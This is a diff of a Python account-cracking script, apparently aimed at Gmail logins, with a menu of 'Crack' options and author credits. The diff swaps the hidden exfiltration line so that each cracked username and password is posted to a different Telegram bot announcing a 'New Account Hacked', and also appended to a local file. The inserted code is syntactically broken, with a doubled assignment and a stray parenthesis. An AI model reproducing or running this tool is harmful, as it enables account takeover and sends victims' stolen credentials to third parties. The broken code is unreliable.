@@ -45,7 +45,6 @@ banek='''\x1b[1;97m
  [\033[32m3\x1b[1;97m] - Crack GMAIL+RAQAM
  [\033[32m4\x1b[1;97m] - Crack GMAIL+PASS
  [\033[32m0\x1b[1;97m] - Exit Tool
-
 '''
 logo = '''\x1b[1;92m
 
@@ -59,11 +58,11 @@ logo = '''\x1b[1;92m
                                                                
                                                                           
 
- 
-TeleGram : @i4m_REX
-TeleGram Chanal : BESTxHACKER
+ github : https://github.com/fardinHack
+ Auther : i4m_REX
+ Telegram Channal : IM_EROR_HACKER
  ---------------------------------------------------------------------
-TanYa Chaware Bka DllM
+ Pleas wait 1h or 2h Thank you for using it
  '''
 logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
 
@@ -176,15 +175,15 @@ def crack():
 			sender =user+' : '+pas
 			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
 			response = requests.get(send_telegram)
-			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
-			responsek = requests.get(send_my)
+			send_my =     t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 FARDIN 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\nBy @i4m_REX")
+            open("Hacked Accounts.txt","a").write(f"{user}:{pasw}\n"))
 			r2+=1
 			os.system('clear')
 			
 			print(logo)
 			print(logo2)
 			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m Checkpoint : '+str(r2))
+			print('\033[93m CP : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
 		
@@ -195,7 +194,7 @@ def crack():
 			print(logo)
 			print(logo2)
 			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m Checkpoint : '+str(r2))
+			print('\033[93m CP : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
 			print(reba)
@@ -213,11 +212,6 @@ def crack():
 			print('\033[93m Checkpoint : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
-
-
-    
-
-
 
 
 
